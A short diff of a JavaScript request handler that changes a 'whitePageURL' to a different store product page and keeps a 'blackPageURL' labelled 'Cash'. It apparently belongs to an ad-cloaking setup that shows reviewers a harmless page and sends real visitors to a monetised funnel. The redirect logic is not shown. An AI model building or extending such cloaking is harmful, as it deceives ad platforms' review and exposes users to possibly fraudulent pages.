@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://bojoni.com/products/remini-parka-jacket-4-colors";
+    const whitePageURL = "https://www.logoofficial.com/collections/new-arrival/products/11053-brm";
     // Cash
     const blackPageURL = "https://YAbHewMyUM.myfunnelish.com/tiktok-vote123-second";
   
